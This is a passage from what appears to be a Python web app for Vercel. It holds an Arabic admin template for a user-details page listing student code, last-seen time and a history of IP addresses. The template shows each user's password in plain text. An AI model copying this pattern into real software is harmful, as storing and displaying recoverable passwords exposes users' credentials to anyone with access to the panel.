            border-bottom: 1px solid #eee;
        }
        .info-label {
            width: 150px;
            font-weight: bold;
            color: #667eea;
        }
        .info-value {
            flex: 1;
            color: #333;
        }
        .password-value {
            font-family: monospace;
            background: #f0f0f0;
            padding: 5px 10px;
            border-radius: 5px;
            display: inline-block;
        }
        .ip-list {
            list-style: none;
        }
        .ip-list li {
            font-family: monospace;
            background: #f8f9fa;
            padding: 5px 10px;
            margin: 5px 0;
            border-radius: 5px;
        }
        .dev-footer {
            text-align: center;
            margin-top: 20px;
            color: rgba(255,255,255,0.8);
        }
        .dev-footer a {
            color: white;
            text-decoration: none;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔍 تفاصيل المستخدم: {{ user_id }}</h1>
            <a href="/admin/users" class="back-btn">رجوع</a>
        </div>
        
        <div class="card">
            <div class="info-row">
                <div class="info-label">معرف المستخدم:</div>
                <div class="info-value">{{ user_id }}</div>
            </div>
            
            <div class="info-row">
                <div class="info-label">كود الطالب:</div>
                <div class="info-value">{{ user_data.student_code or '—' }}</div>
            </div>
            
            <div class="info-row">
                <div class="info-label">كلمة المرور:</div>
                <div class="info-value">
                    <span class="password-value">{{ user_data.password or '—' }}</span>
                </div>
            </div>
            
            <div class="info-row">
                <div class="info-label">آخر IP:</div>
                <div class="info-value">{{ user_data.last_ip or '—' }}</div>
            </div>
            
            <div class="info-row">
                <div class="info-label">آخر ظهور:</div>
                <div class="info-value">{{ user_data.last_seen or '—' }}</div>
            </div>
            
            <div class="info-row">
                <div class="info-label">آخر تحديث:</div>
                <div class="info-value">{{ user_data.updated_at or '—' }}</div>
            </div>
            
            <div class="info-row">
                <div class="info-label">جميع عناوين IP:</div>
                <div class="info-value">
                    {% if user_data.ips and user_data.ips is iterable and user_data.ips is not string %}
                        <ul class="ip-list">
                        {% for ip in user_data.ips %}
                            <li>{{ ip }}</li>
                        {% endfor %}
                        </ul>
                    {% else %}
                        لا توجد عناوين IP مسجلة
                    {% endif %}
                </div>
            </div>
        </div>
        
        <div class="dev-footer">
            <a href="{{ dev_link }}" target="_blank">👨‍💻 {{ dev_name }}</a>
        </div>
    </div>
</body>
</html>
'''

# ========== نقطة الدخول لـ Vercel ==========
# هذا هو المتغير الذي سيتعرف عليه Vercel
app.debug = False
